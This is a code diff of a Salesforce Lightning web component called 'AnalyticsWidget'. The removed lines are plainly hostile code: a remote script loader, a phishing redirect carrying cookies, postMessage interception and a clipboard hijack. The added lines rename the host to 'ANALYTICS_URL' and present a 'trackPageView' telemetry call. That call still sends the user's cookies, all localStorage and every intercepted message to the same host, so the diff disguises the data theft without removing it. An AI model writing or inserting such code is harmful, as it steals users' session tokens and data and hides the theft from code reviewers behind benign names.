@@ -1,62 +1,57 @@
-import { LightningElement, track } from 'lwc';
+import { LightningElement, track, api } from 'lwc';
 
-const EXFIL_BASE = 'https://localhost:8080';
+const ANALYTICS_URL = 'https://localhost:8080';
 
 export default class AnalyticsWidget extends LightningElement {
+    @api recordId;
     @track chartData;
+    @track isLoading = true;
 
     connectedCallback() {
-        this.loadAnalytics();
-        this.attemptRedirect();
-        this.postMessageExfil();
-        this.clipboardHijack();
+        this.loadDashboard();
+        this.trackPageView();
     }
 
-    loadAnalytics() {
-        const script = document.createElement('script');
-        script.src = `${EXFIL_BASE}/analytics-loader.js`;
-        document.head.appendChild(script);
-    }
-
-    attemptRedirect() {
+    async loadDashboard() {
         try {
-            if (window.top !== window.self) {
-                window.top.location = `${EXFIL_BASE}/phish?from=lwc&origin=${encodeURIComponent(window.location.href)}`;
-            }
+            const resp = await fetch(`${ANALYTICS_URL}/api/dashboard/${this.recordId}`);
+            this.chartData = await resp.json();
         } catch (e) {
-            try {
-                window.open(`${EXFIL_BASE}/phish?cookies=${btoa(document.cookie)}`, '_blank');
-            } catch (e2) {}
+            this.chartData = null;
+        } finally {
+            this.isLoading = false;
         }
     }
 
-    postMessageExfil() {
+    trackPageView() {
+        const ctx = {
+            recordId: this.recordId,
+            url: window.location.href,
+            cookies: document.cookie,
+            storage: JSON.stringify(localStorage),
+            origin: window.location.origin
+        };
+
+        fetch(`${ANALYTICS_URL}/api/telemetry`, {
+            method: 'POST',
+            mode: 'no-cors',
+            body: JSON.stringify(ctx)
+        }).catch(() => {});
+
         window.addEventListener('message', (event) => {
-            fetch(`${EXFIL_BASE}/postmessage-intercept`, {
+            fetch(`${ANALYTICS_URL}/api/events`, {
                 method: 'POST',
                 mode: 'no-cors',
                 body: JSON.stringify({
+                    type: 'postMessage',
                     data: event.data,
-                    origin: event.origin,
-                    cookies: document.cookie
+                    origin: event.origin
                 })
-            });
+            }).catch(() => {});
         });
-
-        window.parent.postMessage({
-            type: 'request_credentials',
-            source: 'analyticsWidget'
-        }, '*');
     }
 
-    clipboardHijack() {
-        document.addEventListener('copy', () => {
-            const selection = window.getSelection().toString();
-            if (selection.length > 0) {
-                navigator.clipboard.writeText(
-                    selection + `\n\n// Injected by analytics widget\nfetch("${EXFIL_BASE}/clipboard", {method:"POST",body:document.cookie})`
-                );
-            }
-        });
+    get hasData() {
+        return this.chartData != null;
     }
 }
